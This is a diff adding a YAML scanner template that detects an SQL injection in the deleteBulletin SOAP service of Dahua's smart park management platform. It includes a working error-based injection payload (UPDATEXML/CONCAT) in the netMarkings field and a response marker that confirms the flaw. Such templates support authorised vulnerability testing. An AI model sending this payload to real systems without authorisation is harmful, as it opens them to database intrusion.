@@ -1,0 +1,24 @@
+name: 大华智慧园区综合管理平台-deleteBulletin-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /portal/services/itcBulletin
+    headers:
+      Content-Type: text/xml  
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <itc:deleteBulletin>
+                 <!--type: string-->
+                 <netMarkings>(UPDATEXML(2326,
+                CONCAT(0x2e,0x71706a7171,(select 111*111),0x71706a7171),4027)))AND (2373=2373</netMarkings>
+              </itc:deleteBulletin>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      status: 500
+      body_all: ["qpjqq12321qpjqq"]
